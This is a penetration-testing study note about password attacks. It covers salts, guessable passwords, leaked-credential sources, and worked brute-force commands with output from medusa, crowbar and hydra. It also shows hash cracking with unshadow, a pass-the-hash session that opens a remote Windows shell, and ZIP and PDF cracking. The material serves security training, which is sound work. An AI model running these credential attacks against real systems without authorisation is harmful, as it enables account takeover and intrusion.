# Introduction

## Hash

It is the result of a hashing function using an algorithm that can transform an initial value into an unrecognizable value.
One-way hash: A hash function whose result cannot be traced back to the original value. There is no way, other than through Brute Force, to retrieve the original value of the data.

Some of the various existing hash are:

- [md5](https://en.wikipedia.org/wiki/MD5)
- [sha-n](https://en.wikipedia.org/wiki/Secure_Hash_Algorithms)
- [bcrypt](https://en.wikipedia.org/wiki/Bcrypt)

## Salt Password

The [salt](https://en.wikipedia.org/wiki/Salt_(cryptography)) is an alpha-numeric string that is "hooked" into the password the user provides.

>[!example]
>Salt: `kfpweEkfl%p3/pt`
>Password: `ciaone`
>Password on DB: `kfpweEkfl%p3/ptciaone`
>Hash: `de43a25ea9fa94d3b0bbc87a35ae7f76`

This practice therefore avoids the risk of passwords being cracked via Rainbow Tables.

>[!tip]
>Salt is not in the site DB but in the web app configuration files (usually in config.php or similar).

---

# Password Guessing Attacks

>[!tip]
>Users HATE to remember, and especially to write down, passwords. This rule also applies to everything that requires a password: phone PIN, WiFi access panel, email password, etc. Laziness thus becomes the main exploit.

Therefore, following the golden rule, before attempting anything with any tool, a manual test of the most common or 'lazy' passwords should be carried out first.

## Default Passwords

This type of password is NOT typical of web environments, but of hardware/systems that are not yet functional. Online there are many tables exposing the most common default password for any product.
Remember to search also for instructions pdf for any product: often they contains the default password used for the first installation.

- [CIRT.net default password table](https://cirt.net/passwords)

## Lazy Passwords

These passwords are easily obtained using simple OSINT-related elements.
The most common include tax codes, dates, first and last names or family details.

| Password model | Example |
| --- | --- |
| Consequential characters | qwerty, 123456, abc123, 987654321 |
| Same as username | admin, root, \<username\> |
| Common words | welcome, password, guest, demo, trial, test |
| Common words in l33t format | password1, iloveyou, Password123, p4\$\$w0rd |
| Dates | 01011980, 010180, 01/01/1980, 01-01-1980 |
| Born places | \<cities\> |
| Parents names | \<parent names\> (children or partners) |
| Personal codes | \<tax code\>, \<telephone number\> |

## Old Passwords from Dumps

- [https://haveibeenpwned.com/](https://haveibeenpwned.com/)
- [https://www.dehashed.com/](https://www.dehashed.com/)
- [https://intelx.io/](https://intelx.io/)
- [https://snusbase.com/dashboard](https://snusbase.com/dashboard)
- [https://www.inoitsu.com/](https://www.inoitsu.com/)
- [https://ghostproject.fr/](https://ghostproject.fr/)
- [https://leakix.net/](https://leakix.net/)
- [https://cracked.io/](https://cracked.io/)
- [https://breached.to/](https://breached.to/)

## Dictionary generation

>[!info]
>Precision is generally more important than coverage when considering a dictionary attack, meaning it is more important to create a lean wordlist of relevant passwords than it is to create an enormous, generic wordlist.

Because of this, many wordlists are based on a common theme, such as popular culture references, specific industries, or geographic regions and refined to contain commonly-used passwords.
Kali Linux includes a number of these dictionary files in the `/usr/share/wordlists/` directory and many more are [hosted online](https://github.com/danielmiessler/SecLists).

## Wordlist generation tools:

- https://github.com/shmuelamar/cracken
- [crunch](../Tools/crunch.md)
- https://github.com/Mebus/cupp
- https://github.com/sc0tfree/mentalist
- https://github.com/r3nt0n/bopscrk
- [cewl](../Tools/cewl.md)
- [john (dictionary generation)](../Tools/john.md#Dictionary%20generation)

---

# Common Network Service Attack Methods

>[!tip]
>Bear in mind that password attacks against network services are **noisy**, and in some cases, **dangerous**. Multiple failed login attempts will usually generate **logs** and **warnings** on the target system and may even **lock out accounts** after a pre-defined number of failed login attempts. This could be disastrous during a penetration test, preventing users from accessing production systems until an administrator re-enables the account. Keep this in mind before blindly running a network-based brute force attack.

The hidden art behind network service password attacks is choosing appropriate targets, user lists, and password files carefully and intelligently before initiating the attack.

## HTTP htaccess Attack with Medusa

```bash
kali@kali:~$ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http
-m DIR:/admin
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 123456 (1 of 14344391 com
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 12345 (2 of 14344391 comp
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 123456789 (3 of 14344391
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: password (4 of 14344391 c
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: iloveyou (5 of 14344391 c
...
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: samsung (255 of 14344391
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: freedom (256 of 14344391
ACCOUNT FOUND: [http] Host: 10.11.0.22 User: admin Password: freedom [SUCCESS]
```

## Remote Desktop Protocol Attack with Crowbar

```bash
kali@kali:~$ crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
2019-08-16 04:51:12 START
2019-08-16 04:51:12 Crowbar v0.3.5-dev
2019-08-16 04:51:12 Trying 10.11.0.22:3389
2019-08-16 04:51:13 RDP-SUCCESS : 10.11.0.22:3389 - admin:Offsec!
2019-08-16 04:51:13 STOP
```

## SSH Attack with THC-Hydra

```bash
kali@kali:~$ hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret servic
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-06-07 08:35:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommende
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:143443
[DATA] attacking ssh://127.0.0.1:22/
[22][ssh] host: 127.0.0.1 login: kali password: whatever
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-06-07 08:36:13
```

## HTTP POST Attack with THC-Hydra

```bash
kali@kali:~$ hydra 10.11.0.22 http-form-post
"/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P
/usr/share/wordlists/rockyou.txt -vV -f
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret servic
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-06-07 15:55:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:143443
[DATA] attacking http-post-
form://10.11.0.22/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "123456" - 1 of 14344399 [child 0]
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "12345" - 2 of 14344399 [child 1] (
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "123456789" - 3 of 14344399 [child
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "password" - 4 of 14344399 [child 3
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "princess" - 6 of 14344399 [child 5
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "1234567" - 7 of 14344399 [child 6]
.....
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "karina" - 268 of 14344399 [child 1
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "dookie" - 269 of 14344399 [child 1
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "hotmail" - 270 of 14344399 [child
[ATTEMPT] target 10.11.0.22 - login "admin" - pass "0123456789" - 271 of 14344399 [chi
[80][http-post-form] host: 10.11.0.22 login: admin password: crystal
[STATUS] attack finished for 10.11.0.22 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-06-07 15:55:29
```

## Online Password Attack Tools

- [medusa](../Tools/medusa.md)
- [crowbar](../Tools/crowbar.md)
- [hydra](../Tools/hydra.md)
- [spray](https://github.com/Greenwolf/Spray)
- [msfconsole (auxiliary modules)](../Tools/msfconsole.md#Auxiliary%20Modules)
- [CrackMapExec](../Tools/CrackMapExec.md)

---

# Cracking Hashes

If a salt is involved in the authentication process and we do not know what that salt value is, cracking could become extremely complex, if not impossible, as we must repeatedly hash each potential clear text password with various salts.

Nevertheless, in our experience we have almost always been able to capture the password hash along with the salt, whether from a database that contains both of the unique values per record, or from a configuration or a binary file that uses a single salt for all hashed values.
When both of the values are known, password cracking decreases in complexity.

## Hash cracking Tools:

- hash-identifier (tool)
- [hashid](https://psypanda.github.io/hashID/) (tool)
- [Openwall](http://openwall.info/wiki/john/sample-hashes) (web)
- [HashKiller](https://hashkiller.co.uk/) (web)
- unshadow (tool)
    
    ```bash
    kali@kali:~$ unshadow passwd-file.txt shadow-file.txt
    victim:$6$fOS.xfbT$5c5vh3Zrk.88SbCWP1nrjgccgYvCC/x7SEcjSujtrvQfkO4pSWHaGxZojNy.vAqMGrBBNOb0P3pW1ybxm2OIT/:1003:1003:,,,:/home/victim:/bin/bash
    kali@kali:~$ unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
    ```
    
- [john](../Tools/john.md)
- [hashcat](../Tools/hashcat.md)

---

# Passing the hash

The Pass-the-Hash (PtH) technique allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a clear text password. If we discover a password hash on one target, we cannot only use it to authenticate to that target, we can use it to authenticate to another target as well, as long as that target has an account with the same username and password.

>[!tip]
>When a connection is performed, it normally uses a special admin share called Admin$ . In order to establish a connection to this share, the attacker must present valid credentials with local administrative permissions. In other words, this type of lateral movement typically requires local administrative rights.

When performing PtH, behind the scenes, the format of the NTLM hash we provided was changed into a **NetNTLM** version 1 or 2 [^1] format during the authentication process.
We can capture these hashes using man-in-the-middle or poisoning attacks and either [crack them](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html) or [relay them](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html).

[^1]: https://en.wikipedia.org/wiki/NT_LAN_Manager#NTLMv1

For example, some applications like Internet Explorer and Windows Defender use the Web Proxy Auto-Discovery Protocol ([WPAD](https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol)) to detect proxy settings.  If we are on the local network, we could poison these requests and force NetNTLM authentication with a tool like [Responder.py](https://github.com/SpiderLabs/Responder) which creates a rogue WPAD server designed to exploit this security issue.

## PtH Tools

- [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
    
    ```bash
    kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
    E_md4hash wrapper called.
    HASH PASS: Substituting user supplied NTLM HASH...
    Microsoft Windows [Version 10.0.16299.309]
    (c) 2017 Microsoft Corporation. All rights reserved.
    C:\Windows\system32>
    ```
    
- [PsExec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
- [impacket](../Tools/impacket.md#Pass-the-Hash)
- [CrackMapExec](../Tools/CrackMapExec.md)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm)

---

# Cracking other type of files

## Cracking ZIP files

```bash
┌──(kali㉿kali)-[~]
└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt pwd_arch.zip

PASSWORD FOUND!!!!: pw == xoxoxo
```

## Cracking PDF files

- [john external scripts](../Tools/john.md#External%20scripts)
    
    ```
    ┌──(kali㉿kali)-[~]
    └─$ /usr/share/john/pdf2john.pl file.pdf > hash
    
    ┌──(kali㉿kali)-[~]
    └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
    ```
    
- [pdfcrack](https://github.com/robins/pdfcrack)